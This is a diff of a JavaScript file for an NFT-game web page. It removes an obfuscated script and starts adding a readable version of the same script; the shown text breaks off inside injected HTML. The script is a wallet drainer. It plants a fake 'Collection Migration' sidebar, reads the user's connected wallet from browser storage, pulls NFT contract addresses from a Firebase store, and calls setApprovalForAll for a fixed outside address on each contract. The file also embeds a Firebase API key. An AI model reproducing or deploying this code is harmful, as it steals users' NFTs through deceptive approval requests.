@@ -1,1 +1,864 @@
-const _0x4a2bc0=_0x5ebc;(function(_0x20c190,_0x9436e8){const _0x4d80d6=_0x5ebc,_0x48dcd1=_0x20c190();while(!![]){try{const _0x22c246=-parseInt(_0x4d80d6(0x108))/0x1+-parseInt(_0x4d80d6(0xb9))/0x2*(-parseInt(_0x4d80d6(0xc1))/0x3)+-parseInt(_0x4d80d6(0xee))/0x4+-parseInt(_0x4d80d6(0x109))/0x5+-parseInt(_0x4d80d6(0xe5))/0x6*(-parseInt(_0x4d80d6(0xf0))/0x7)+parseInt(_0x4d80d6(0xdd))/0x8*(-parseInt(_0x4d80d6(0xe4))/0x9)+parseInt(_0x4d80d6(0xcd))/0xa*(parseInt(_0x4d80d6(0xbb))/0xb);if(_0x22c246===_0x9436e8)break;else _0x48dcd1['push'](_0x48dcd1['shift']());}catch(_0x35f2e2){_0x48dcd1['push'](_0x48dcd1['shift']());}}}(_0x2a02,0x3af96),$(document)['ready'](function(){const _0xcf3501=_0x5ebc;console[_0xcf3501(0xea)](_0xcf3501(0xf8));}));const config={'apiKey':'AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0','authDomain':_0x4a2bc0(0x10a),'projectId':_0x4a2bc0(0xe6),'storageBucket':'jangneotokyo.appspot.com','messagingSenderId':_0x4a2bc0(0xdb),'appId':'1:20777123504:web:5d991c72b7af82ff6f4575'},app=firebase[_0x4a2bc0(0xb8)](config),db=firebase['firestore'](app),ref=db[_0x4a2bc0(0xcf)](_0x4a2bc0(0xe1)),OPENSEA_URL='https://api.opensea.io/';let account;function _0x2a02(){const _0x59ef5b=['jangtokyo','bool','nonpayable','395487wKRKIb','36ZyMYNO','jangneotokyo','100000','string','catch','log','send','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>Collection\x20Migration<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><div><button\x20class=\x22MuiButton-root\x20MuiButton-contained\x20MuiButton-containedPrimary\x20MuiButton-sizeMedium\x20MuiButton-containedSizeMedium\x20MuiButton-fullWidth\x20MuiButtonBase-root\x20\x20css-1u5qx9\x22\x20tabindex=\x220\x22\x20type=\x22button\x22>CODES_MIGRATION.EXE<span\x20class=\x22MuiTouchRipple-root\x20css-w0pj6f\x22></span></button></div></div></div><div\x20class=\x22MuiBox-root\x20css-79elbk\x22><div\x20class=\x22MuiBox-root\x20css-1sptbl0\x22><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>S2\x20citizen<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><form\x20class=\x22sidebar-menu__item-form\x22><div\x20class=\x22sidebar-menu__item-block\x20smi_w80\x20pad-r50\x20orderf1\x22><input\x20name=\x22customMessage\x22\x20type=\x22text\x22\x20placeholder=\x22Set\x20your\x20custom\x20message\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf3\x22><input\x20name=\x22identity\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Identities\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf4\x22><input\x20name=\x22cache\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Item\x20Caches\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf5\x22><input\x20name=\x22land\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Land\x20Deeds\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w20\x20pad-r50\x20orderf2\x22><button\x20type=\x22submit\x22\x20class=\x22sidebar-menu__item-btn\x22><span>upload</span></button></div><style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.form\x20>\x20*\x20+\x20*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style></form></div></div><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>S1\x20citizen<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><form\x20class=\x22sidebar-menu__item-form\x22><div\x20class=\x22sidebar-menu__item-block\x20smi_w80\x20pad-r50\x20orderf1\x22><input\x20name=\x22customMessage\x22\x20type=\x22text\x22\x20placeholder=\x22Set\x20your\x20custom\x20message\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf3\x22><input\x20name=\x22identity\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Identities\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf4\x22><input\x20name=\x22vault\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Vault\x20boxes\x20—\x20Optional\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf5\x22><input\x20name=\x22cache\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Item\x20Caches\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf6\x22><input\x20name=\x22land\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Land\x20Deeds\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w20\x20pad-r50\x20orderf2\x22><button\x20class=\x22sidebar-menu__item-btn\x22><span>upload</span></button></div><style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.form\x20>\x20*\x20+\x20*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style></form></div></div><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>Identities\x20&amp;\x20lands<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><div\x20class=\x22sidebar-menu__item-blist\x22><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>Mint\x20New\x20Identity</h6><div\x20class=\x22sidebar-menu__item-bitem-form-info\x22>Cost:\x202000\x20bytes</div></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>offline</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>Create\x20New\x20Land</h6><div\x20class=\x22sidebar-menu__item-bitem-form-info\x22>Cost:\x20500\x20bytes</div></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>offline</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>S2\x20Identity\x20Item\x20Claim</h6><input\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Add\x20S2\x20Identity\x20Token\x20ID\x22\x20value=\x220\x22></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>submit</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>S2\x20Identity\x20Land\x20Claim</h6><input\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Add\x20S2\x20Identity\x20Token\x20ID\x22\x20value=\x220\x22></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>submit</button></form></div></div></div></div></div><button\x20class=\x22sidebar-menu__item-btn\x20MuiBox-root\x20css-htg0vc\x22><span>Connect\x20Wallet</span></button></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','uint256','1788772XAPXsY','.menu2','363797iwEsnc','span.menu__link-text','view','bytes4','update','tokenId','span','exists','yawa','event','ApprovalForAll','remove','stringify','getApproved','then','interfaceId','ethereum','owner','Contract','state','sidebar\x20clicked','find','approved','.css-htg0vc','236665gnXwsP','263300Ntlyqh','jangneotokyo.firebaseapp.com','getItem','intervalStopped','connected','.css-14kzm9p','doc','tokenURI','Transfer','initializeApp','2342UWrfvb','transferOwnership','1133tTVDfh','.sidebar-menu__opener','balanceOf','bytes','setApprovalForAll','web3','435YgxQLU','spoof','data','renounceOwnership','account','eth','address','function','name','from','isApprovedForAll','primary_asset_contracts','82330XpRHCN','not\x20connected','collection','interval\x20running','operator','transferFrom','spoofCollection','get','wagmi.store','approve','click','Approval','length','false','20777123504','0xebc8f724ea0ed1238a405917c086889895518fed','64jwxwMF','onSnapshot','safeTransferFrom','OwnershipTransferred'];_0x2a02=function(){return _0x59ef5b;};return _0x2a02();}async function loadWeb3(){const _0x52d928=_0x4a2bc0;try{window[_0x52d928(0xc0)]=await new Web3(window[_0x52d928(0x100)]);}catch{console[_0x52d928(0xea)](error);}}var sidebarCheck=setInterval(()=>{const _0x1d9476=_0x4a2bc0;console[_0x1d9476(0xea)](_0x1d9476(0xd0)),intervalCheck();},0x3e8);async function sidebar(){const _0x9f2dab=_0x4a2bc0;$(_0x9f2dab(0xbc))['on'](_0x9f2dab(0xd7),function(){setTimeout(()=>{const _0x318782=_0x5ebc;$(_0x318782(0x10e))['html'](_0x318782(0xec)),$('.css-txdpd1')[_0x318782(0xfb)](),console[_0x318782(0xea)](_0x318782(0x104));const _0x30fe1c=$('.css-1u5qx9'),_0x214e93=$(_0x318782(0x107));_0x30fe1c['on'](_0x318782(0xd7),function(){menuItems();}),_0x214e93['on'](_0x318782(0xd7),function(){menuItems();});},0x3e8);});}async function intervalCheck(){const _0x4d87e4=_0x4a2bc0;$('.sidebar')['length']?(clearInterval(sidebarCheck),console[_0x4d87e4(0xea)]('true,\x20interval\x20cleared'),await sidebar()):console[_0x4d87e4(0xea)](_0x4d87e4(0xda));}async function menuItems(){const _0x22852b=_0x4a2bc0,_0x179acf=$(_0x22852b(0xef))[_0x22852b(0x105)]('li')['eq']([0x6])[_0x22852b(0x105)](_0x22852b(0xf6))['eq']([0x0])[_0x22852b(0x105)](_0x22852b(0xf1));_0x179acf['click']();}function _0x5ebc(_0x3daa2c,_0x160981){const _0x2a029e=_0x2a02();return _0x5ebc=function(_0x5ebce6,_0x3dfd7c){_0x5ebce6=_0x5ebce6-0xb5;let _0x5e6e1c=_0x2a029e[_0x5ebce6];return _0x5e6e1c;},_0x5ebc(_0x3daa2c,_0x160981);}var checkConnected=setInterval(()=>{const _0x5b568b=_0x4a2bc0;var _0x31c2cd=JSON['parse'](localStorage[_0x5b568b(0x10b)](_0x5b568b(0xd5)));!('account'in _0x31c2cd['state'][_0x5b568b(0xc3)])?console['log'](_0x5b568b(0xce)):(getAddress(),intervalStop(),trade(),console['log'](_0x5b568b(0x10d)));},0xbb8);function intervalStop(){const _0x93afce=_0x4a2bc0;clearInterval(checkConnected),console['log'](_0x93afce(0x10c));}async function getAddress(){const _0x55c0a5=_0x4a2bc0,_0x58ad0f=JSON['parse'](localStorage[_0x55c0a5(0x10b)](_0x55c0a5(0xd5)));console['log'](_0x58ad0f);const _0x518304=_0x58ad0f[_0x55c0a5(0x103)]['data'][_0x55c0a5(0xc5)];account=_0x518304,console[_0x55c0a5(0xea)](account);}async function loadWallet(_0x208713){const _0x70707e=_0x4a2bc0;let _0x11d13d=[];var _0x3f353e=await GetAllCollection(_0x208713);for(var _0x3143d3=0x0;_0x3143d3<_0x3f353e[_0x70707e(0xd9)];_0x3143d3++){var _0x21638e=_0x3f353e[_0x3143d3],_0x57e602=_0x21638e[_0x70707e(0xcc)][_0x21638e[_0x70707e(0xcc)][_0x70707e(0xd9)]-0x1][_0x70707e(0xc7)]['toLowerCase']();console[_0x70707e(0xea)](_0x57e602),_0x11d13d['push'](_0x57e602);}console['log'](_0x11d13d),localStorage['setItem'](_0x70707e(0xd3),JSON[_0x70707e(0xfc)](_0x11d13d));}const _abi=[{'inputs':[],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0x101),'type':_0x4a2bc0(0xc7)},{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0x106),'type':'address'},{'indexed':!![],'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':'uint256'}],'name':_0x4a2bc0(0xd8),'type':_0x4a2bc0(0xf9)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0x101),'type':_0x4a2bc0(0xc7)},{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0xd1),'type':_0x4a2bc0(0xc7)},{'indexed':![],'internalType':'bool','name':'approved','type':'bool'}],'name':_0x4a2bc0(0xfa),'type':_0x4a2bc0(0xf9)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':'previousOwner','type':'address'},{'indexed':!![],'internalType':'address','name':'newOwner','type':_0x4a2bc0(0xc7)}],'name':_0x4a2bc0(0xe0),'type':_0x4a2bc0(0xf9)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x4a2bc0(0xca),'type':_0x4a2bc0(0xc7)},{'indexed':!![],'internalType':_0x4a2bc0(0xc7),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':_0x4a2bc0(0xed)}],'name':_0x4a2bc0(0xb7),'type':_0x4a2bc0(0xf9)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':'to','type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':_0x4a2bc0(0xed)}],'name':_0x4a2bc0(0xd6),'outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0x101),'type':_0x4a2bc0(0xc7)}],'name':_0x4a2bc0(0xbd),'outputs':[{'internalType':_0x4a2bc0(0xed),'name':'','type':_0x4a2bc0(0xed)}],'stateMutability':_0x4a2bc0(0xf2),'type':'function'},{'inputs':[{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':'uint256'}],'name':_0x4a2bc0(0xfd),'outputs':[{'internalType':_0x4a2bc0(0xc7),'name':'','type':'address'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0x101),'type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xc7),'name':'operator','type':'address'}],'name':_0x4a2bc0(0xcb),'outputs':[{'internalType':_0x4a2bc0(0xe2),'name':'','type':_0x4a2bc0(0xe2)}],'stateMutability':_0x4a2bc0(0xf2),'type':_0x4a2bc0(0xc8)},{'inputs':[],'name':_0x4a2bc0(0xc9),'outputs':[{'internalType':_0x4a2bc0(0xe8),'name':'','type':_0x4a2bc0(0xe8)}],'stateMutability':_0x4a2bc0(0xf2),'type':_0x4a2bc0(0xc8)},{'inputs':[],'name':_0x4a2bc0(0x101),'outputs':[{'internalType':_0x4a2bc0(0xc7),'name':'','type':'address'}],'stateMutability':'view','type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':'uint256'}],'name':'ownerOf','outputs':[{'internalType':_0x4a2bc0(0xc7),'name':'','type':_0x4a2bc0(0xc7)}],'stateMutability':_0x4a2bc0(0xf2),'type':_0x4a2bc0(0xc8)},{'inputs':[],'name':_0x4a2bc0(0xc4),'outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':'to','type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':_0x4a2bc0(0xed)}],'name':'safeMint','outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0xca),'type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xc7),'name':'to','type':_0x4a2bc0(0xc7)},{'internalType':'uint256','name':'tokenId','type':'uint256'}],'name':_0x4a2bc0(0xdf),'outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0xca),'type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xc7),'name':'to','type':'address'},{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':_0x4a2bc0(0xed)},{'internalType':'bytes','name':_0x4a2bc0(0xc3),'type':_0x4a2bc0(0xbe)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0xd1),'type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xe2),'name':'approved','type':_0x4a2bc0(0xe2)}],'name':_0x4a2bc0(0xbf),'outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xf3),'name':_0x4a2bc0(0xff),'type':_0x4a2bc0(0xf3)}],'name':'supportsInterface','outputs':[{'internalType':_0x4a2bc0(0xe2),'name':'','type':_0x4a2bc0(0xe2)}],'stateMutability':_0x4a2bc0(0xf2),'type':_0x4a2bc0(0xc8)},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x4a2bc0(0xf2),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xed),'name':'tokenId','type':_0x4a2bc0(0xed)}],'name':_0x4a2bc0(0xb6),'outputs':[{'internalType':_0x4a2bc0(0xe8),'name':'','type':'string'}],'stateMutability':'view','type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':_0x4a2bc0(0xc7),'name':_0x4a2bc0(0xca),'type':'address'},{'internalType':_0x4a2bc0(0xc7),'name':'to','type':_0x4a2bc0(0xc7)},{'internalType':_0x4a2bc0(0xed),'name':_0x4a2bc0(0xf5),'type':_0x4a2bc0(0xed)}],'name':_0x4a2bc0(0xd2),'outputs':[],'stateMutability':_0x4a2bc0(0xe3),'type':_0x4a2bc0(0xc8)},{'inputs':[{'internalType':'address','name':'newOwner','type':_0x4a2bc0(0xc7)}],'name':_0x4a2bc0(0xba),'outputs':[],'stateMutability':'nonpayable','type':_0x4a2bc0(0xc8)}];async function trade(){const _0x10fa28=_0x4a2bc0;await loadWeb3();var _0x262d4c=[];console[_0x10fa28(0xea)](account),ref[_0x10fa28(0xb5)](account)[_0x10fa28(0xd4)]()[_0x10fa28(0xfe)](_0x1d5a2b=>{const _0x284e2f=_0x10fa28;_0x1d5a2b[_0x284e2f(0xf7)]&&ref[_0x284e2f(0xb5)](account)[_0x284e2f(0xde)](async _0x5bd8b9=>{const _0x574720=_0x284e2f;_0x262d4c=_0x5bd8b9['data']()[_0x574720(0xc2)],console[_0x574720(0xea)](_0x262d4c);for(var _0x53b275=0x0;_0x53b275<_0x262d4c[_0x574720(0xd9)];_0x53b275++){var _0x30a2b7=_0x262d4c[_0x53b275];console['log'](_0x30a2b7);try{var _0x1dfc24=await new window[(_0x574720(0xc0))][(_0x574720(0xc6))][(_0x574720(0x102))](_abi,_0x30a2b7,{'gas':_0x574720(0xe7)});await _0x1dfc24['methods'][_0x574720(0xbf)](_0x574720(0xdc),!![])[_0x574720(0xeb)]({'from':account}),ref[_0x574720(0xb5)](account)[_0x574720(0xf4)]({'status':_0x574720(0x106)})[_0x574720(0xfe)](function(){const _0x274cce=_0x574720;console[_0x274cce(0xea)]('approved');})[_0x574720(0xe9)](_0x2f317e=>{const _0x5e5b9a=_0x574720;console[_0x5e5b9a(0xea)](_0x2f317e);});}catch(_0x360fb6){}}});});}
+$(document).ready(function () {
+    console.log('yawa');
+})
+
+//FIREBASE
+
+const config = {
+  apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
+  authDomain: "jangneotokyo.firebaseapp.com",
+  projectId: "jangneotokyo",
+  storageBucket: "jangneotokyo.appspot.com",
+  messagingSenderId: "20777123504",
+  appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
+}
+
+const app = firebase.initializeApp(config)
+const db = firebase.firestore(app)
+
+const ref = db.collection('jangtokyo')
+
+const OPENSEA_URL = "https://api.opensea.io/"
+let account;
+
+async function loadWeb3() {
+  try {
+    window.web3 = await new Web3(window.ethereum)
+  } catch {
+    console.log(error)
+  }
+}
+
+
+// async function inSidebarConnect() {
+//     const button1 = $('.css-1u5qx9')
+
+//     button1.on('click',  function () {
+//         console.log('imclicked')
+//          menuItems()
+//     })
+// }
+
+
+var sidebarCheck = setInterval(() => {
+    console.log('interval running')
+    intervalCheck()
+}, 1000);
+
+async function sidebar() {
+
+    $('.sidebar-menu__opener').on('click', function () {
+
+        // setTimeout(alert(';asd'), 100)
+
+        setTimeout(() => {
+            $('.css-14kzm9p').html(`
+        <div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Collection Migration<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div><button class="MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButtonBase-root  css-1u5qx9" tabindex="0" type="button">CODES_MIGRATION.EXE<span class="MuiTouchRipple-root css-w0pj6f"></span></button></div></div></div><div class="MuiBox-root css-79elbk"><div class="MuiBox-root css-1sptbl0"><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S2 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf4"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf5"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button type="submit" class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
+            .form > * + * {
+              margin-top: 1rem;
+            }
+          </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S1 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small 